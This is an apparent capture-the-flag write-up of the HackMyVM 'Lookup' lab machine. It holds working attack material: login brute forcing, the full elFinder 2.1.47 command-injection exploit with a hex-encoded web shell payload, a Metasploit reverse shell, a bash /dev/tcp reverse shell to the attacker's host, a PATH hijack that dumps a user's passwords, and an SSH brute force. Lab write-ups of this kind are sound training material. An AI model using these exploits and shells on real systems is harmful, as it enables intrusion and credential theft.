# CTF Penetration Testing

## HackMyVM

### Lookup - Machine

#### Machine Description

- Machine name: [Lookup](https://hackmyvm.eu/machines/machine.php?vm=Lookup)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟨 Medium

<img src="https://hackmyvm.eu/img/vm/lookup.png" alt="Lookup Machine Logo" width="150"/>

#### Tools Used

- Burp Suite
- ffuf
- Gobuster
- LINpeas
- Netcat
- Nikto
- Nmap
- pwncat
- SearchSploit
- Metasploit

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.134 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.134`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 11:08 EDT
Nmap scan report for 192.168.56.134
Host is up (0.0018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) ←
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) ←
MAC Address: 08:00:27:8E:87:AC (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.19 seconds
```

`nmap -Pn -sSVC -p80 -T5 192.168.56.134`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 11:56 EDT
Nmap scan report for 192.168.56.134
Host is up (0.00060s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.hmv ←
MAC Address: 08:00:27:8E:87:AC (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.56 seconds
```

`echo -e "192.168.56.134\tlookup.hmv" | tee -a /etc/hosts`:
```
192.168.56.134  lookup.hmv ←
```

`whatweb http://192.168.56.134 -v`:
```
WhatWeb report for http://192.168.56.134
Status    : 302 Found
Title     : <None>
IP        : 192.168.56.134
Country   : RESERVED, ZZ

Summary   : Apache[2.4.41], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], RedirectLocation[http://lookup.hmv] ←

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.41 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Ubuntu Linux
        String       : Apache/2.4.41 (Ubuntu) (from server string)

[ RedirectLocation ]
        HTTP Server string location. used with http-status 301 and 
        302 

        String       : http://lookup.hmv (from location) ←

HTTP Headers:
        HTTP/1.1 302 Found
        Date: Mon, 07 Oct 2024 17:22:17 GMT
        Server: Apache/2.4.41 (Ubuntu)
        Location: http://lookup.hmv
        Content-Length: 0
        Connection: close
        Content-Type: text/html; charset=UTF-8

WhatWeb report for http://lookup.hmv ←
Status    : 200 OK ←
Title     : Login Page
IP        : 192.168.56.134
Country   : RESERVED, ZZ

Summary   : Apache[2.4.41], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], PasswordField[password]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.41 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Ubuntu Linux
        String       : Apache/2.4.41 (Ubuntu) (from server string)

[ PasswordField ]
        find password fields 

        String       : password (from field name)

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Mon, 07 Oct 2024 17:22:19 GMT
        Server: Apache/2.4.41 (Ubuntu)
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 359
        Connection: close
        Content-Type: text/html; charset=UTF-8
```

`nikto -h http://lookup.hmv`:
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.134
+ Target Hostname:    lookup.hmv
+ Target Port:        80
+ Start Time:         2024-10-07 11:25:39 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /login.php: Admin login page/section found. ←
+ 7962 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2024-10-07 11:26:10 (GMT-4) (31 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`gobuster dir -u http://lookup.hmv -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 30`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.hmv
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   400,401,404,500
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,html,php,bak,jpg,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 719] ←
/.php                 (Status: 403) [Size: 275]
/login.php            (Status: 200) [Size: 1] ←
/.html                (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]

[...]
```

`curl -s "http://lookup.hmv"`:
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <form action="login.php" method="post"> ←
      <h2>Login</h2>
      <div class="input-group">
        <label for="username">Username</label>
        <input type="text" id="username" name="username" required>
      </div>
      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
      </div>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
```

`firefox` > `http://lookup.hmv/`

`burpsuite`

`HTTP Request`:
```http
POST /login.php HTTP/1.1 ←
Host: lookup.hmv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://lookup.hmv
Connection: close
Referer: http://lookup.hmv/
Cookie: login_status=success
Upgrade-Insecure-Requests: 1

username=TEST&password=TEST123 ←
```
`HTTP Response`:
```http
HTTP/1.1 200 OK
Date: Mon, 07 Oct 2024 18:11:22 GMT
Server: Apache/2.4.41 (Ubuntu)
Refresh: 3; url=http://lookup.hmv
Vary: Accept-Encoding
Content-Length: 74 ←
Connection: close
Content-Type: text/html; charset=UTF-8

Wrong username or password. Please try again.<br>Redirecting in 3 seconds. ←
```

<❌ Failed Step.>

`cat /usr/share/wordlists/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt | tr '[:upper:]' '[:lower:]' | sort -u > ./xato_usernames_lowercase.txt`

`cat ./xato_usernames_lowercase.txt | head -n 10`:
```
$2003india
$2a_w2s
$2forholly
$4feiz
$4mazy
$6njvu
$6xyn
$7138444
$73dry
$7sehj
```

`ffuf -u "http://lookup.hmv/login.php" -d "username=USERNAME&password=PASSWORD" -w ./xato_usernames_lowercase.txt:USERNAME -w ./xato_usernames_lowercase.txt:PASSWORD -mode pitchfork -H "Content-Type: application/x-www-form-urlencoded" -fr "Wrong" -c -ic -t 30`:
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.hmv/login.php
 :: Wordlist         : USERNAME: /home/kali/xato_usernames_lowercase.txt
 :: Wordlist         : PASSWORD: /home/kali/xato_usernames_lowercase.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=USERNAME&password=PASSWORD
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Wrong username or password.
________________________________________________

[...]
```

</❌ Failed Step.>

`firefox` > `http://lookup.hmv/`

`burpsuite`

`HTTP Request`:
```http
POST /login.php HTTP/1.1
Host: lookup.hmv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://lookup.hmv
Connection: close
Referer: http://lookup.hmv/
Cookie: login_status=success
Upgrade-Insecure-Requests: 1

username=admin&password=TEST123 ←
```
`HTTP Response`:
```http
HTTP/1.1 200 OK
Date: Mon, 07 Oct 2024 18:06:42 GMT
Server: Apache/2.4.41 (Ubuntu)
Refresh: 3; url=http://lookup.hmv
Content-Length: 62 ←
Connection: close
Content-Type: text/html; charset=UTF-8

Wrong password. Please try again.<br>Redirecting in 3 seconds. ←
```

`ffuf -u "http://lookup.hmv/login.php" -d "username=admin&password=PASSWORD" -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords.txt:PASSWORD -H "Content-Type: application/x-www-form-urlencoded" -fr "Wrong password." -c -ic -t 30`:
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.hmv/login.php
 :: Wordlist         : PASSWORD: /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=admin&password=PASSWORD
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Wrong password.
________________________________________________

password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 2ms] ←

[...]
```

`firefox` > `http://lookup.hmv/`

`burpsuite`

`HTTP Request`:
```http
POST /login.php HTTP/1.1
Host: lookup.hmv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://lookup.hmv
Connection: close
Referer: http://lookup.hmv/
Cookie: login_status=success
Upgrade-Insecure-Requests: 1

username=admin&password=password123 ←
```
`HTTP Response`:
```http
HTTP/1.1 200 OK
Date: Tue, 08 Oct 2024 11:31:52 GMT
Server: Apache/2.4.41 (Ubuntu)
Refresh: 3; url=http://lookup.hmv
Vary: Accept-Encoding
Content-Length: 74
Connection: close
Content-Type: text/html; charset=UTF-8

Wrong username or password. Please try again.<br>Redirecting in 3 seconds. ←
```

`ffuf -u "http://lookup.hmv/login.php" -d "username=USERNAME&password=password123" -w ./xato_usernames_lowercase.txt:USERNAME -H "Content-Type: application/x-www-form-urlencoded" -fr "Wrong username or password." -c -ic -t 30`:
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.hmv/login.php
 :: Wordlist         : USERNAME: /home/kali/xato_usernames_lowercase.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=USERNAME&password=password123
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Wrong username or password.
________________________________________________

jose                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms] ←

[...]
```

`firefox` > `http://lookup.hmv/`

`burpsuite`

`HTTP Request`:
```http
POST /login.php HTTP/1.1
Host: lookup.hmv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://lookup.hmv
Connection: close
Referer: http://lookup.hmv/
Cookie: login_status=success
Upgrade-Insecure-Requests: 1

username=jose&password=password123 ←
```
`HTTP Response`:
```http
HTTP/1.1 302 Found ←
Date: Tue, 08 Oct 2024 11:37:44 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: login_status=success; expires=Tue, 08-Oct-2024 12:37:44 GMT; Max-Age=3600; path=/; domain=lookup.hmv
Location: http://files.lookup.hmv ←
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

`echo -e "192.168.56.134\tfiles.lookup.hmv" | tee -a /etc/hosts`:
```
192.168.56.134  files.lookup.hmv ←
```

`firefox` > `files.lookup.hmv` >> `http://files.lookup.hmv/elFinder/elfinder.html#elf_l1_Lw` > `About this software`:
```
### elFinder ←

Web file manager

Version: 2.1.47 ←

protocol version: 2.1047

jQuery/jQuery UI: 3.3.1/1.12.1
```

`dirsearch -u http://files.lookup.hmv/elFinder/`:
```
  _|. _ _  _  _  _ _|_    v0.4.3                             
 (_||| _) (/_(_|| (_| )                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_files.lookup.hmv/_elFinder__24-10-08_07-38-58.txt

Target: http://files.lookup.hmv/

[07:38:58] Starting: elFinder/                                                                                                                             
[07:35:44] 301 -  326B  - /elFinder/js  ->  http://files.lookup.hmv/elFinder/js/
[07:35:44] 301 -  327B  - /elFinder/php  ->  http://files.lookup.hmv/elFinder/php/
[07:36:27] 200 -  638B  - /elFinder/bower.json                              
[07:36:28] 200 -   54KB - /elFinder/Changelog ←                              
[07:36:30] 200 -    1KB - /elFinder/composer.json                           
[07:36:33] 301 -  327B  - /elFinder/css  ->  http://files.lookup.hmv/elFinder/css/
[07:36:53] 301 -  329B  - /elFinder/files  ->  http://files.lookup.hmv/elFinder/files/
[07:36:53] 200 -  871B  - /elFinder/files/                                  
[07:36:58] 301 -  327B  - /elFinder/img  ->  http://files.lookup.hmv/elFinder/img/
[07:37:01] 200 -  532B  - /elFinder/js/                                     
[07:37:02] 200 -    1KB - /elFinder/LICENSE.md                              
[07:37:12] 200 -  427B  - /elFinder/package.json                            
[07:37:14] 200 -  903B  - /elFinder/php/                                    

[...]
```

`curl -s http://files.lookup.hmv/elFinder/Changelog`:
```
        * elFinder (2.1.47): ←
                - [js] Fixed #2820 remove Multi-byte space characters
                - [js:jqueryelfinder] bugfix of elfinder reload(restart) on dialogelfinder
                - [ui:places] Fixed #2822 set title attr correctly
                - [ui:tree] add an option `uiOptions.tree.attrTitle` to enable set path info to title attr
                - [js:editors.default] support tinyMCE 5 and integrate image uploader
                - [js:dialogelfinder] Fixed #2824 freezes browser in uses dialogelfinder
                - [ui:button] add CSS class `elfinder-button-{COMMAND NAME}-menu` to submenu
                - [ui:sortbutton] Fixed #2829 sort menu is not synchronized with the data of cwd
                - [ui:cwd] Fixed #2840 thumbnail is not created when adding an image to an empty folder
                - [ui:cwd] Fixed #2836 setting CWD icons size not working
                - [php:core] Fixed #2842 allow to cancel upload on upload.presave callback
                - [js:core] Fixed #2845 `size` request with wrong params `targets`
                - [php:session] Fixed #2857 consideration for environment other than "apache2 SAPI"
                - [cmd:fullscreen] Fixed #2858 add an option of fullscreen mode screen/window
                - And some minor bug fixes

[...]
```

`searchsploit elfinder`:
```
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
elFinder 2 - Remote Command Execution (via File Creation)                     | php/webapps/36925.py
elFinder 2.1.47 - 'PHP connector' Command Injection                           | php/webapps/46481.py ←
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)   | php/remote/46539.rb ←
elFinder Web file manager Version - 2.1.53 Remote Command Execution           | php/webapps/51864.txt
------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

`cat /usr/share/exploitdb/exploits/php/webapps/46481.py`:
```python
#!/usr/bin/python

'''
# Exploit Title: elFinder <= 2.1.47 - Command Injection vulnerability in the PHP connector.
# Date: 26/02/2019
# Exploit Author: @q3rv0
# Vulnerability reported by: Thomas Chauchefoin
# Google Dork: intitle:"elFinder 2.1.x"
# Vendor Homepage: https://studio-42.github.io/elFinder/
# Software Link: https://github.com/Studio-42/elFinder/archive/2.1.47.tar.gz
# Version: <= 2.1.47
# Tested on: Linux 64bit + Python2.7
# PoC: https://www.secsignal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/
# CVE: CVE-2019-9194

# Usage: python exploit.py [URL]

'''

import requests
import json
import sys

payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'

def usage():
    if len(sys.argv) != 2:
        print "Usage: python exploit.py [URL]"
        sys.exit(0)

def upload(url, payload):
    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}
    data = {
        "reqid": "1693222c439f4",
        "cmd": "upload",
        "target": "l1_Lw",
        "mtime[]": "1497726174"
    }

    r = requests.post("%s/php/connector.minimal.php" % url, files=files, data=data)
    j = json.loads(r.text)
    
    return j['added'][0]['hash']

def imgRotate(url, hash):
    r = requests.get(
        "%s/php/connector.minimal.php?target=%s&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c"
        % (url, hash)
    )
    return r.text

def shell(url):
    r = requests.get("%s/php/SecSignal.php" % url)
    
    if r.status_code == 200:
        print "[+] Pwned! :)"
        print "[+] Getting the shell..."
        
        while 1:
            try:
                input = raw_input("$ ")
                r = requests.get("%s/php/SecSignal.php?c=%s" % (url, input))
                print r.text
            except KeyboardInterrupt:
                sys.exit("\nBye kaker!")
    else:
        print "[*] The site seems not to be vulnerable :("

def main():
    usage()
    
    url = sys.argv[1]
    print "[*] Uploading the malicious image..."
    hash = upload(url, payload)
    
    print "[*] Running the payload..."
    imgRotate(url, hash)
    
    shell(url)

if __name__ == "__main__":
    main()
```

`msfconsole -q`

`search elfinder`, `use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection`, `set PAYLOAD php/meterpreter/reverse_tcp`, `show options`, `set RHOSTS files.lookup.hmv`, `set TARGETURI /elFinder/`, `set LHOST 192.168.56.118`, `set LPORT 4444`, `exploit`:
```
[*] Started reverse TCP handler on 192.168.56.118:4444 
[*] Uploading payload 'sc5PAww.jpg;echo 6370202e2e2f66696c65732f736335504177772e6a70672a6563686f2a202e687354536c6835522e706870 |xxd -r -p |sh& #.jpg' (1960 bytes) ←
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.hsTSlh5R.php) ... ←
[*] Sending stage (39927 bytes) to 192.168.56.134
[+] Deleted .hsTSlh5R.php
[*] Meterpreter session 1 opened (192.168.56.118:4444 -> 192.168.56.134:47042) at 2024-10-08 07:45:38 -0400 ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`shell -t`

`whoami`:
```
www-data ←
```

`id`:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`uname -a`:
```
Linux lookup 5.4.0-156-generic #173-Ubuntu SMP Tue Jul 11 07:25:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.6 LTS
Release:        20.04
Codename:       focal
```

`ls -alps /var/www`:
```
total 20
4 drwxr-xr-x  5 root     root     4096 Apr  2  2024 ./
4 drwxr-xr-x 14 root     root     4096 Jul 30  2023 ../
4 drwxr-xr-x  3 www-data www-data 4096 Jul 30  2023 files.lookup.hmv/
4 drwxr-xr-x  2 www-data www-data 4096 Apr  2  2024 html/
4 drwxr-xr-x  3 www-data www-data 4096 Jul 30  2023 lookup.hmv/
```

`ls -alps /home`:
```
total 12
4 drwxr-xr-x  3 root  root  4096 Jun  2  2023 ./
4 drwxr-xr-x 19 root  root  4096 Jan 11  2024 ../
4 drwxr-xr-x  5 think think 4096 Jan 11  2024 think/ ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`pwncat-cs -lp 4444`:
```
[10:02:13] Welcome to pwncat 🐈!
bound to 0.0.0.0:4444 ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`bash -i >& /dev/tcp/192.168.56.118/4444 0>&1`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
[10:02:21] received connection from 192.168.56.134:37830 ←
[10:02:22] 192.168.56.134:37830: registered new host w/ db
```

`upload /home/kali/tools/linpeas.sh /var/www/html/linpeas.sh`:
```
./linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 860.3/860.3 KB • ? • 0:00:00
[10:14:09] uploaded 860.34KiB in 0.73 seconds ←
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`cd /var/www/html`

`chmod u+x ./linpeas.sh`

`./linpeas.sh > ./linpeas_output.txt`

`cat -n ./linpeas_output.txt`:
```
[...]

  1085                        ╔════════════════════════════════════╗
  1086  ══════════════════════╣ Files with Interesting Permissions 
  1087                        ╚════════════════════════════════════╝
  1088  ╔══════════╣ SUID - Check easy privesc, exploits and write perms
  1089  ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid  

[...]

  1117  -rwsr-sr-x 1 root root 17K Jan 11  2024 /usr/sbin/pwm (Unknown SUID binary!) ←

[...]
```

`file /usr/sbin/pwm`:
```
/usr/sbin/pwm: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=01ec8570b00af8889beebc5f93c6d56fb9cc1083, for GNU/Linux 3.2.0, not stripped ←
```

`/usr/sbin/pwm`:
```
[!] Running 'id' command to extract the username and user ID (UID) ←
[!] ID: www-data
[-] File /home/www-data/.passwords not found ←
```

`ls -alps /home/think/`:
```
total 40
4 drwxr-xr-x 5 think think 4096 Jan 11  2024 ./
4 drwxr-xr-x 3 root  root  4096 Jun  2  2023 ../
0 lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
4 -rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
4 -rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
4 drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache/
4 drwx------ 3 think think 4096 Aug  9  2023 .gnupg/
4 -rw-r----- 1 root  think  525 Jul 30  2023 .passwords ←
4 -rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
4 drw-r----- 2 think think 4096 Jun 21  2023 .ssh/
0 lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
4 -rw-r----- 1 root  think   33 Jul 30  2023 user.txt
```

`which id`:
```
/usr/bin/id ←
```

`echo $PATH`:
```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ←
```

`id think`:
```
uid=1000(think) gid=1000(think) groups=1000(think) ←
```

`cd /tmp`

`vim ./id`:
```
echo "uid=1000(think) gid=1000(think) groups=1000(think)"
```

`PATH=/tmp:$PATH`

`echo $PATH`:
```
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ←
```

`chmod 777 ./id`

`/usr/sbin/pwm`:
```
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd

[...]
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./think_passwords.list`:
```
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd

[...]
```

`hydra -l 'think' -P ./think_passwords.list 192.168.56.134 ssh`:
```                                                                 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-08 13:11:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:1/p:50), ~4 tries per task
[DATA] attacking ssh://192.168.56.134:22/
[22][ssh] host: 192.168.56.134   login: think   password: josemario.AKA(think) ←
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-08 13:11:45
```

`su think`:
```
Password: ←
```

![Victim: think](https://img.shields.io/badge/Victim-think-64b5f6?logo=linux&logoColor=white)

